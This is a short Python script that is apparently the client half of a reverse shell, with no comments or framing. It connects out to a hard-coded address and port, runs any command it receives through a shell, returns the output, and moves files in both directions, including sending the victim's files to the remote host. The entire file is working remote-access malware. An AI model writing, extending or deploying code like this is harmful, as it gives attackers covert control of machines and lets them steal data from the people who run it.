import socket 
import subprocess
import os

def download_file(command):

    file_name = command[7:]
    file_bytes = b""

    sock.settimeout(1)

    while True:
        try:
            data = sock.recv(1024)
        except socket.timeout:
            break

        if file_bytes[-5:] == b"<END>":
            break
        else:
            file_bytes += data
    
    sock.settimeout(None)

    file = open(file_name,"wb")
    file.write(file_bytes)
    file.close()

def upload_file(file_name):

    with open(file_name,"rb") as file:
        data = file.read()
    
    sock.send(data)
    sock.send(b"<END>")

    file.close()
    
if __name__ == '__main__':
    HOST = "192.168.1.104"
    PORT = 5549

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((HOST,PORT))

    while True:
      
        command = sock.recv(1024).decode()
    
        if command[:6] == "upload":

            download_file(command)

        if command[:8] == "download":

            upload_file(command[9:])

        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
            except:
                pass 

        elif command == "exit":
            break
        else:
            try:
                result = b""
                result = subprocess.Popen([command],shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
                sock.sendall(result.stdout.read())
            except:
                pass
       
 

     



